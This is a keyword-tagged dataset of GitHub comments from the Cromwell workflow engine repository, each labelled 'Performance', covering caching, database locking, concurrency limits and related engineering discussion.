Performance,Note from [an earlier PR](https://github.com/broadinstitute/cromwell/pull/3350#discussion_r172275966): File literals can happen on input or output. There may be room for optimization if a file has already loaded contents we may not need to reload it twice. Follow the wiring/specs/conformance-tests and see if this makes sense.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3359#issuecomment-370636226:170,optimiz,optimization,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3359#issuecomment-370636226,2,"['load', 'optimiz']","['loaded', 'optimization']"
Performance,Note: This PR breaks the cromwell-as-a-git-submodle functionality. But I've got verbal confirmation from @hjfbynara that Green is no longer using cromwell this way. This is the error that one sees with the `sbt-git` used in this PR plus a git submodule:. ```java; fatal: Invalid gitfile format: /Users/kshakir/src/cromwell/.git; [error] java.util.NoSuchElementException: head of empty stream; [error] 	at scala.collection.immutable.Stream$Empty$.head(Stream.scala:1104); [error] 	at scala.collection.immutable.Stream$Empty$.head(Stream.scala:1102); [error] 	at com.typesafe.sbt.SbtGit$.$anonfun$buildSettings$21(SbtGit.scala:138); [error] 	at sbt.internal.util.Init$Value.$anonfun$apply$3(Settings.scala:804); [error] 	at sbt.internal.util.EvaluateSettings.$anonfun$constant$1(INode.scala:197); [error] 	at sbt.internal.util.EvaluateSettings$MixedNode.evaluate0(INode.scala:214); [error] 	at sbt.internal.util.EvaluateSettings$INode.evaluate(INode.scala:159); [error] 	at sbt.internal.util.EvaluateSettings.$anonfun$submitEvaluate$1(INode.scala:82); [error] 	at sbt.internal.util.EvaluateSettings.sbt$internal$util$EvaluateSettings$$run0(INode.scala:93); [error] 	at sbt.internal.util.EvaluateSettings$$anon$3.run(INode.scala:89); [error] 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); [error] 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); [error] 	at java.lang.Thread.run(Thread.java:745); [error] java.util.NoSuchElementException: head of empty stream; ```. cc https://github.com/broadinstitute/cromwell/issues/644,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2785#issuecomment-339382680:1253,concurren,concurrent,1253,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2785#issuecomment-339382680,2,['concurren'],['concurrent']
Performance,"Note: in terms of actually improving performance, the answer will likely be Akka/thread pool type things that were discussed in #ftfy before break",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456953574:37,perform,performance,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456953574,1,['perform'],['performance']
Performance,"Note:. There exists an optional namespace cache in the WDL draft-2 version of `validateNamespace`. WaaS uses only `getWomBundle` and `createExecutable`, so it currently has no interaction with the cache for any language version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241:42,cache,cache,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241,2,['cache'],['cache']
Performance,"Oh I see, insertion order in a map is definitely NOT preserved currently. They're backed by a classic unsorted HashMap. There would probably be performance implications if we were to switch to LinkedHashMap or a TreeMap to preserve order but maybe a `sort` function on arrays could make this easier.; Tagging @cjllanwarne who might want to chime in as this relates cloesly to WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271:144,perform,performance,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271,1,['perform'],['performance']
Performance,"Oh, this part is not essential to the basic suggestion, but since we put our outputs someplace else after the workflow finishes, it would also be nice not to keep them in the execution folder, but instead refer to their new locations for cache eligibility purposes. Not essential, because even just getting rid of our multiple large intermediate files would make caching more feasible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064#issuecomment-417458574:238,cache,cache,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064#issuecomment-417458574,1,['cache'],['cache']
Performance,"Ok, now a legit PR. @mcovarr does your thumb still hold? Changes were fairly minimal since you looked but feel free to comment. @Horneth you already did some digging and some of the followup changes involved pulling in your call cache 404 stuff, can you take a look?. @ruchim can you take a look at your label stuff?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311795514:229,cache,cache,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311795514,1,['cache'],['cache']
Performance,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:120,cache,cache,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140,2,['cache'],['cache']
Performance,"Okay so my understanding of this so far (I'm just reiterating what you have in your diagram for my own benefit):. `ShadowWorkflowActor` has 4 ""lifecycle"" states as actors:; - `MaterializeWorkflowDescriptorActor` - basic validation and `WorkflowDescriptor` creation; - `EngineWorkflowInitializationActor` - spawns 1 or more `BackendWorkflowInitializationActor`, then aggregates results from all of these and message back `ShadowWorkflowActor`; - `EngineWorkflowExecutionActor` - sent a Start or Restart message, performs the execution, sends back result of execution. Spawns `BackendWorkflowExecutionActor`s; - `EngineWorkflowFinalizationActor` - do post-workflow termination actions. Spawns `BackendWorkflowFinalizationActor`s. _I'm just thinking out loud here... if you think this is stupid, I won't feel bad if you ignore me_. I guess the only comments on this scheme are about naming... . I feel like `MaterializeWorkflowDescriptorActor` should follow the same naming scheme and maybe be called something like `EngineWorkflowDescriptorActor` or `EngineWorkflowParserActor`. I'm also not a huge fan of prepending `Engine` onto these actors... maybe we can just drop `Engine`?; - `WorkflowDescriptorActor`; - `WorkflowInitializationActor`; - `WorkflowExecutionActor`; - `WorkflowFinalizationActor`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545:511,perform,performs,511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545,1,['perform'],['performs']
Performance,"Okay, thank you so much for the answer. In this case, then, I would ask if using. `docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json""`. is it possible to achieve acceleration in Google Life Sciences or is it possible to use this cache method only for acceleration when running on the local backend?. I am thinking of such a solution, do you think it is in line with cromwell's good practices? -> distribute calculations according to whether I estimate they will be heavy and if so send them to google life sciences for calculation and if not calculate them on the local backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880:96,cache,cache-manifest-file,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880,2,['cache'],"['cache', 'cache-manifest-file']"
Performance,"On develop Cromwell running locally with local MySQL, this WDL takes about 30 seconds to write 400,050 metadata rows. Does this need to be more performant than that? Perhaps the problem before was a lack of batched DB writes?. ```; task IntToIntArray {; Int number. command <<<; python <<CODE; for i in range(${number}):; print(i); CODE; >>>. runtime {; docker: ""python@sha256:bda277274d53484e4026f96379205760a424061933f91816a6d66784c5e8afdf""; memory: ""1 GB""; preemptible: 2; }. output {; Array[Int] array = read_lines(stdout()); }; }. workflow wide {; call IntToIntArray { input: number = 200000 }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1776#issuecomment-295922229:144,perform,performant,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1776#issuecomment-295922229,1,['perform'],['performant']
Performance,"Once I implemented a cache locally the workflow runs to Succeeded, but then the Centaur test fails because it's configured to expect workflowfailure. Judging by the fact that this test was part of [Tyburn](https://github.com/broadinstitute/tyburn/pull/27/files) which I believe lacked support for asserting failures, I don't think this is the correct expectation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892:21,cache,cache,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892,1,['cache'],['cache']
Performance,"One other possible explanation could be a bug we found in the post processing of a successful job when cromwell tries to read the value of the RC file. If for some reason cromwell failed to read it, it would get stuck in a stale running state. If that happens to enough workflows and then a concurrent-workflows-limit set, then it would produce the observed behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1874#issuecomment-273625290:291,concurren,concurrent-workflows-limit,291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1874#issuecomment-273625290,1,['concurren'],['concurrent-workflows-limit']
Performance,"One thing I'd like to see before trying stuff is to have a setup that can reliably reproduce the problem and allows us to at least sorta kinda measure how effective our stopgaps & solution attempts are. . For instance, is it possible that cranking the queue size causes something else to fall over? It'd be good to know that before diving in. (Probably not, but just trying to make the point)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311532510:252,queue,queue,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311532510,1,['queue'],['queue']
Performance,"One thing you can try is setting `concurrent-job-limit` to 2 or similar so that only a small, fixed number of jobs launch simultaneously. That does work with the local Docker backend because it's a universal Cromwell property, independent of backends. https://github.com/broadinstitute/cromwell/issues/1841",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032700631:34,concurren,concurrent-job-limit,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032700631,1,['concurren'],['concurrent-job-limit']
Performance,Ooooh none of us could remember the exact reason but I think you’re right. And iirc there was some performance problem which was eventually tracked down to be something silly we hadn’t accounted for. This makes sense,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2948#issuecomment-347748418:99,perform,performance,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2948#issuecomment-347748418,1,['perform'],['performance']
Performance,"Ooop, I might have misspoke. I thought the copy strategy did actually log that it was copying, but I realised that what I was seeing was that the `hard link` had failed, and knew that it was copying based on that:. > `WARN - Localization via hard link has failed: /path/to/destination.file -> /path/to/original.file: Invalid cross-device link`. I think it still might be useful, but I realise there's actually no precedent here. ---. Oh, so the path+modtime sort of just works? I was under the impression it wouldn't for those cache-strategies. I don't know if it wouldn't try, or would never succeed because I never tried, but here's what the [docs say](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options):. > - ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; > - ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. Thanks for the reply!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219:527,cache,cache-strategies,527,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219,1,['cache'],['cache-strategies']
Performance,"Per prior user feedback,; > [HSQLDB has got to be the worst performing embedded database designed in the history of mankind.](https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757). and we do not recommend it, like, at all, unless your use case is tiny. Likewise, `run` mode is; > [Appropriate for prototyping or demo use on a user's local machine. Features are limited and the web API is not supported.](https://cromwell.readthedocs.io/en/stable/Modes/). For real workflows – certainly anything running more than 1 hour – the path is `server` mode with a daemon-type relational DB like PostgreSQL or MySQL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693:60,perform,performing,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693,1,['perform'],['performing']
Performance,Performance comparison between old (production) and new (with slick bug fix) Cromwell versions here: https://docs.google.com/document/d/1bvO63-FAotUcV0NPAwXo591QAI2VYrqUp_sU8rE1-14,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5332#issuecomment-579463064:0,Perform,Performance,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5332#issuecomment-579463064,1,['Perform'],['Performance']
Performance,Performance tests against the refactor are highlighted by the blue boxes:. ![Screen Shot 2019-09-09 at 5 33 44 PM](https://user-images.githubusercontent.com/13006282/64624289-6dbc2200-d3b8-11e9-8fc9-f9be83cd9f36.png),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529971535:0,Perform,Performance,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529971535,1,['Perform'],['Performance']
Performance,"Perhaps I missed it, but it seems like we are still publishing the cache hit results as soon as we get a hit, not after copying succeeds? Maybe it wasn't meant to be a part of this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300170214:67,cache,cache,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300170214,1,['cache'],['cache']
Performance,"Pinging @gbggrant on this one, when this is merged it's another tool in your all's arsenal for stability under load",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/442#issuecomment-182545324:111,load,load,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/442#issuecomment-182545324,1,['load'],['load']
Performance,"Pretty sure this was fixed by @delocalizer way back in #4109. However during my debugging of `globbingBehavior` for #4854, it seemed something was rotten in the state of `GenomicsHighPriorityQue-c1ed17c72de5fcb`. I still don't 100% know the setup for the AWS queues, but I think a) perhaps we just never updated ecs-proxy over in quay?, and/or b) maybe the ARN ""fixes"" in #4896/#4902 pulled in Conrad's fixes?. Either way #4958 stops excluding the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4855#issuecomment-491122782:259,queue,queues,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4855#issuecomment-491122782,1,['queue'],['queues']
Performance,Quick update. I tweaked the config to be:; ```; system {; job-rate-control {; jobs = 1; per = 2 second; }; }; ```. and ran the test workflow above. I saw maximum concurrency - i.e. Batch requested the full number of vCPUs set in my compute environment (100). About 500 jobs succeeded before Cromwell threw an OOM exception. No Batch API Request Limit exceptions were encountered.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443927567:162,concurren,concurrency,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443927567,1,['concurren'],['concurrency']
Performance,"Quoth Dave: Green Team launched 50 workflows and could initially query the API despite some slowness. After they’ve been running for 45 mins or so, hitting the API is only intermittently successful:. ```; https://cromwell.gotc-staging.broadinstitute.org/api/workflows/v1/query; Ooops! The server was not able to produce a timely response to your request.; Please try again in a short while!; ```. ```; Unexpected error while awaiting Cromwell Workflow completion: Error hitting REST API: https://cromwell.gotc-staging.broadinstitute.org/api/workflows/v1/5296889b-8b88-41db-a5fa-d1071ac22a... => Unexpected response code: 502; ```. Just trying to get to the swagger page takes a couple of minutes to load or fails to load altogether. This is highly variable - about 2 hours in we still have 50 workflows running and API queries are coming back very quickly. In production using Cromwell 0.19, GotC routinely runs ~200-500 workflows simultaneously.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228405075:699,load,load,699,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228405075,2,['load'],['load']
Performance,"Ran it on 25_hotfix, call logs available here:; https://console.cloud.google.com/storage/browser/cloud-cromwell-dev/cromwell_execution/ruchi/BrokenFilePath/16caeb92-3c39-496b-bf44-7cd1e5c33269/call-PadTargets/?project=broad-dsde-cromwell-dev. Failed to delocalize files:; ```; 2017/03/20 16:48:49 I: Running command: sudo gsutil -q -m cp -L /var/log/google-genomics/out.log /mnt/local-disk/targets.padded.tsv gs://cloud-cromwell-dev/cromwell_execution/ruchi/BrokenFilePath/16caeb92-3c39-496b-bf44-7cd1e5c33269/call-PadTargets/targets.padded.tsv; 2017/03/20 16:48:51 E: command failed: CommandException: No URLs matched: /mnt/local-disk/targets.padded.tsv; CommandException: 1 file/object could not be transferred.; (exit status 1); ```. Stderr:; ```; Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell_root/tmp.TdaNa3; Error: Could not find or load main class org.broadinstitute.hellbender.Main; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-287825949:845,load,load,845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-287825949,1,['load'],['load']
Performance,"Re:. > The capoeira tests complete successfully but get unexpected cache hits. Caching is also tweaked in CI configs. For example:. https://github.com/broadinstitute/cromwell/blob/279909b1f35c8305dcfc23ac8534dcb00ce09771/src/ci/resources/local_provider_config.inc.conf#L6. Have you already tried the tests locally with the CI configs? For unicromtal, one can run the existing CI scripts with a bit of bootstrap:; - Setup vault; - Setup mysql locally (I'm using `brew install mysql`); - [Initialize a `travis` mysql user with granted permissions](https://dev.mysql.com/doc/refman/8.0/en/adding-users.html); - [Using the `travis` user create a `cromwell_test` schema](https://github.com/broadinstitute/cromwell/blob/279909b1f35c8305dcfc23ac8534dcb00ce09771/core/src/test/resources/application.conf#L24). From the cromwell source directory, with all of the above setup, one can try to run `src/ci/resources/testCentaurLocal.sh` and it will render the configs with vault and run the tests, including the restart tests that bring down/up cromwell. Also, if one just wants to ever use the CI configs with cromwell in IntelliJ, `sbt renderCiResources` will render configs into the folder `target/ci/resources`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580:67,cache,cache,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580,1,['cache'],['cache']
Performance,"ReadPacket(MysqlIO.java:3334) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3774) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2447) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2594) ~[cromwell.jar:0.19]; at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2541) ~[cromwell.jar:0.19]; at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:4882) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionProxy.setAutoCommit(ConnectionProxy.java:334) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionJavassistProxy.setAutoCommit(ConnectionJavassistProxy.java) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.endInTransaction(JdbcBackend.scala:443) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$Commit$.run(JdbcActionComponent.scala:48) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$Commit$.run(JdbcActionComponent.scala:46) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; Caused by: java.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.; at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:2926) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3344) ~[cromwell.jar:0.19]; ... 16 common frames omitted. Saw this in workflow 9c68fe34-7a9e-434a-b958-aa4d91339da9, can't figure out which JES operations ID this is associated with, it's not captured really in the metadata...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/742#issuecomment-221909650:4184,concurren,concurrent,4184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/742#issuecomment-221909650,2,['concurren'],['concurrent']
Performance,"Recently for an operation task that updating labels for ~2500 workflows, we have to write a loop to end ~2500 PATCH /label requests to the Cromwell, which took more than 3 hrs. (In Cromwell IAM, this is even worse since a single token will expire in 60mins, so you have to also deal with the token refreshment) . We tried to use multi-threading to speed it up but ended up getting transient 500 errors when using a thread pool with a size of >=4 threads. . So having this batch feature will make a lot of things much easier!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3755#issuecomment-451759631:329,multi-thread,multi-threading,329,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3755#issuecomment-451759631,1,['multi-thread'],['multi-threading']
Performance,"Reconstruction of what happened in an example [Travis run](https://api.travis-ci.org/v3/job/437851243/log.txt):. 1. Workflow `8a9e2f5a-6a2d-46bf-aaf2-3e96ae6b1e84` starts; 2. `Pre-Processing /tmp/cwl_temp_dir_3896235319398625139/cwl_temp_file_2349128968287406252.cwl`; 3. Workflow `8a9e2f5a-6a2d-46bf-aaf2-3e96ae6b1e84` restarts; 4. `Pre-Processing /tmp/cwl_temp_dir_9082469087888012942/cwl_temp_file_1703244947031990588.cwl`; 5. Workflow fails with `File not found: gs://cloud-cromwell-dev/cromwell_execution/travis/cwl_temp_file_1703244947031990588.cwl#cwl-cache-between-workflows/8a9e2f5a-6a2d-46bf-aaf2-3e96ae6b1e84/call-step-product/rc`; 6. The output `gs://cloud-cromwell-dev/cromwell_execution/travis/cwl_temp_file_2349128968287406252.cwl#cwl-cache-between-workflows/8a9e2f5a-6a2d-46bf-aaf2-3e96ae6b1e84` exists!. The output was written to a path matching the pre-restart temp filename, but we're looking for it at a path based on the new post-restart temp filename.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428605945:559,cache,cache-between-workflows,559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428605945,2,['cache'],['cache-between-workflows']
Performance,"Regarding the supervision/exceptions-- for better or worse, our akka Actors are still using a lot of scala Futures. In the case of the call to `copyCachedOutputs`, the entire method call is wrapped in a `Future.apply()` via `BackendCacheHitCopyingActor.receive`:. ``` scala; def receive: Receive = LoggingReceive {; case CopyOutputsCommand(simpletons, jobDetritus, returnCode) =>; performActionThenRespond(Future(copyCachedOutputs(simpletons, jobDetritus, returnCode)), onFailure = cachingFailed, andThen = context stop self); case AbortJobCommand =>; abort(); context.parent ! AbortedResponse(jobDescriptor.key); context stop self; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848:381,perform,performActionThenRespond,381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848,1,['perform'],['performActionThenRespond']
Performance,"Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99221,concurren,concurrent,99221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"Right I just meant that in the tests the ratio (DB access / executedCode) may be higher compared to ""normal execution"" where we spend a lot of time waiting for calls to end. But yes production will definitely not be an easier environment than tests :); I kinda like the DataAccess actor option, although I think slick already manages its own pool of threads and everything, so maybe just by tweaking some configuration we could improve performance before going full Super Saiyan Actor Scaling mode.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444:436,perform,performance,436,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444,1,['perform'],['performance']
Performance,"Right, so when I put in the batched metadata i ran into exactly this. I talked to bernick and the tl;dr was that he felt CloudSQL would be able to take this much further (hooray for our production) but any MySQL instance would need proper tuning to handle a load like this, and that that point it'd be a YMMV situation where every setup would be a bit different. If you're poking around this space try pointing at a CloudSQL and see if that helps, I never did verify that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2086#issuecomment-288824418:258,load,load,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2086#issuecomment-288824418,1,['load'],['load']
